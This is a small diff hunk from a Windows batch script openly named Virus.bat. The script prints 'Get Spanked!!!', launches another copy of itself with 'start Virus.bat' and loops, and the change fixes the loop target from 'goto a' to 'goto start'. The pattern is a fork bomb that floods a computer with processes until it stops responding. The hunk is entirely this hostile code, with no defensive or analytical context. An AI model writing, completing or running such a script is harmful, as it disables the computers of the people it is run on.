@@ -6,4 +6,4 @@ echo Get Spanked!!!
 
 start Virus.bat
 
-goto a
+goto start
